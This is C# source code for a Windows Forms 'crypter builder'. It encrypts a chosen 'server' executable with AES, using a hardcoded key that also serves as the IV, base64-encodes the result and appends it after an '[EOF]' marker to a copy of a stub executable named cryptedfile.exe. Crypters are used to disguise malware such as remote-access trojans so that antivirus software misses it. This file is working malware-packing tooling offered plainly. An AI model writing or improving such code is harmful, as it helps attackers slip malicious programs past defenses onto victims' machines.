using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;


namespace Patrick_Crypter_Builder
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
		}

		private void Form1_Load(object sender, EventArgs e)
		{

		}

		private void button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog server = new OpenFileDialog();
			server.Filter = "Exe | *.exe";
			if (server.ShowDialog() == DialogResult.OK)
				textBox1.Text = server.FileName;
		}

		private void button2_Click(object sender, EventArgs e)
		{
			OpenFileDialog stub = new OpenFileDialog();
			stub.Filter = "Exe | *.exe";
			if (stub.ShowDialog() == DialogResult.OK)
				textBox2.Text = stub.FileName;
		}

		private void button3_Click(object sender, EventArgs e)
		{
			string password = "AfzdIHOfGi7323Sf";
			byte[] server = File.ReadAllBytes(textBox1.Text);
			RijndaelManaged rijAlg = new RijndaelManaged();
			rijAlg.Key = Encoding.ASCII.GetBytes(password);
			rijAlg.IV = Encoding.ASCII.GetBytes(password);
			ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
			MemoryStream msEncrypt = new MemoryStream();
			CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write);
			
			csEncrypt.Write(server, 0,server.Length);
			csEncrypt.Close();
			string base64 = Convert.ToBase64String(msEncrypt.ToArray());
			if(File.Exists(Directory.GetCurrentDirectory() + @"\cryptedfile.exe"))
            {
				File.Delete(Directory.GetCurrentDirectory() + @"\cryptedfile.exe");
            }
			File.Copy(textBox2.Text, Directory.GetCurrentDirectory() + @"\cryptedfile.exe");
			File.AppendAllText(Directory.GetCurrentDirectory() + @"\cryptedfile.exe", "[EOF]" + Convert.ToBase64String(msEncrypt.ToArray()));





		}

		private void textBox3_TextChanged(object sender, EventArgs e)
		{
			
		}
	}
}
